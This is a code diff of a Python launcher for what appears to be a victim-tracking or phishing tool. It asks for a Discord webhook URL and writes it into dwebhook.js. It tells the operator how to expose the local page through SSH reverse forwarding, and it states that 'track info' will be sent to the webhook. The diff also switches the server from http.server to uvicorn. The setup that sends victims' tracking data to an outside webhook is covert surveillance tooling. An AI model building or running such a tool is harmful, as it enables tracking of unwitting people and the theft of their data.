@@ -38,19 +38,11 @@ except:
     pass
 
 print(f'Enter Discord Webhoook url:')
-input1 = input()
 
-bef = 'var discord = {webhook : "'
+dwebhook_input = input()
 
-aft = f"{input1}"
-
-end = '",};'
-
-wh = f"{bef}{aft}{end}"
-
-file1 = open('dwebhook.js', 'a')
-
-file1.write(wh)
+file1 = open('dwebhook.js', 'w')
+file1.write(dwebhook_input)
 file1.close()
 
 
@@ -62,5 +54,5 @@ print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localh
 print(f'{Y}Localhost Link: {W}http://localhost:8000/index.html')
 print(f'{C}track info will be sent to your discord webhook.\n')
 
-os.system("python3 -m http.server")
+os.system("uvicorn main:web_app --reload")
 
